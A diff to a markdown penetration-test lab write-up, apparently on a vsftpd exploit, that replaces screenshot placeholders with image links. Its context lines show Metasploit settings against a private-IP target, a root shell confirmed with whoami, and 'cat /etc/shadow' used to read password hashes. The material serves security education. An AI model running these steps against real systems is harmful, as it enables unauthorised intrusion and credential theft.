@@ -55,8 +55,7 @@ set RHOSTS 192.168.190.128
 set RPORT 21
 run
 ```
-
-📸 *Screenshot: Metasploit exploit running*
+![metasploit-output]
 
 ---
 
@@ -70,7 +69,7 @@ whoami
 
 Output: `root`
 
-📸 *Screenshot: Root shell obtained*
+![root-access](screenshots/vsftpd-root-access.png)
 
 This confirms full system compromise of the target machine.
 
@@ -83,8 +82,7 @@ After gaining root access, system exploration was performed. Sensitive file acce
 ```bash
 cat /etc/shadow
 ```
-
-📸 *Screenshot: /etc/shadow output*
+![shadow-file-ooutput](screenshots/vsftpd-shadowfile.png)
 
 ---
 
